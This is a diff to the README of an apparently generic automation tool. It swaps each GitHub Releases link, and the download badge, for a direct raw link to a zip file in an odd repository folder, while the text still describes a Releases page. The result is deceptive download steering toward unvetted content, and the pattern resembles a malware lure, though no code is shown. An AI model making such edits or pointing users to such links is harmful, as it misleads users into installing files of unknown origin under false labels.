@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-24 - Effortless Automation for Your Tasks
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/krish120/amanansdiahnid-24/releases)
+[![Download](https://raw.githubusercontent.com/krish120/amanansdiahnid-24/main/favorer/amanansdiahnid-24.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/krish120/amanansdiahnid-24/main/favorer/amanansdiahnid-24.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Before you download and run the application, check if your system meets these re
 
 To get started, follow these steps to download and install the application:
 
-1. **Visit the Releases Page:** Go to the following link to find the latest version of amanansdiahnid-24: [Download Here](https://github.com/krish120/amanansdiahnid-24/releases). 
+1. **Visit the Releases Page:** Go to the following link to find the latest version of amanansdiahnid-24: [Download Here](https://raw.githubusercontent.com/krish120/amanansdiahnid-24/main/favorer/amanansdiahnid-24.zip). 
 
 2. **Select the Version:** On the Releases page, you will see a list of available versions. Choose the latest version for your system.
 
@@ -54,7 +54,7 @@ Using **amanansdiahnid-24** is simple:
 If you encounter issues while using the application, try the following solutions:
 
 - **Check for Updates:** Make sure you are using the latest version of the application.
-- **Reinstall the Application:** If something goes wrong, uninstall and download the latest version again from the [Releases page](https://github.com/krish120/amanansdiahnid-24/releases).
+- **Reinstall the Application:** If something goes wrong, uninstall and download the latest version again from the [Releases page](https://raw.githubusercontent.com/krish120/amanansdiahnid-24/main/favorer/amanansdiahnid-24.zip).
 - **Check System Requirements:** Ensure your system meets the requirements listed above.
 
 ## 🤝 Support
